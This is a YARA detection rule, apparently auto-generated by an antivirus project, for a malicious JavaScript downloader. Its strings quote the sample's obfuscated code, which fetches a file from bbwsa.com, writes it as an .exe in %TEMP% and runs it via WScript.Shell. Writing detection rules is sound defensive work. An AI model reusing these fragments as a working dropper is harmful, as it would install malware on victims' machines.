rule sig_20160328_0672b1ba6f4b438c005543f5675e69de {
  meta:
    description = "datamaliciousorder - file 20160328_0672b1ba6f4b438c005543f5675e69de.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cec0a8b309ac70c89fb51a3fd8ef0841018601b6713983af3cd2649bba369d89"

  strings:
    $s1  = "function Dzwtp() {return Fhxplssy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"XBugdijDYYcKTFP.exe\";};" fullword ascii
    $s2  = "Abrjdvqrwp[Tehtjh](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Airab](Ptmlpgjex() * 11)} while (Abrjdvqrwp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Hkhabmb(Jljxhtnwd, Tpazg){return Jljxhtnwd - Tpazg;};" fullword ascii
    $s5  = "var Fhxplssy = function Yjmyidhm() {return WScript[Xosotbdqhy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nfdllic(){return Nokaxlmo;};" fullword ascii
    $s7  = "function Roxcelpb() {return ((Gygcn == true) && (Gygcn == Webfhcdmtk)) ? 1 : Dzsjen;};" fullword ascii
    $s8  = "function Bgwnsrama(Bvbahd){Fhxplssy[\"Run\"](Bvbahd, Dzsjen, Dzsjen);};" fullword ascii
    $s9  = "function Ptmlpgjex(){return 22;};" fullword ascii
    $s10 = "function Hfmwr(Xywsqzqbkn) {var Ohaqcv = (1, 2, 3, 4, 5, Xywsqzqbkn); return Ohaqcv;};" fullword ascii
    $s11 = "Webfhcdmtk = true; " fullword ascii
    $s12 = "Gygcn = true; " fullword ascii
    $s13 = "var Uhmllr = new this[\"Date\"]();" fullword ascii
    $s14 = "return Hkhabmb(Usuhwnzhps, Cjzgx);" fullword ascii
    $s15 = "function Uvmfmh()" fullword ascii
    $s16 = "var Gygcn = false;" fullword ascii
    $s17 = "var Ricexdgr = false;" fullword ascii
    $s18 = "function Tyweep(){return Xosotbdqhy;};" fullword ascii
    $s19 = " while (Umspvh){" fullword ascii
    $s20 = "var Webfhcdmtk = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}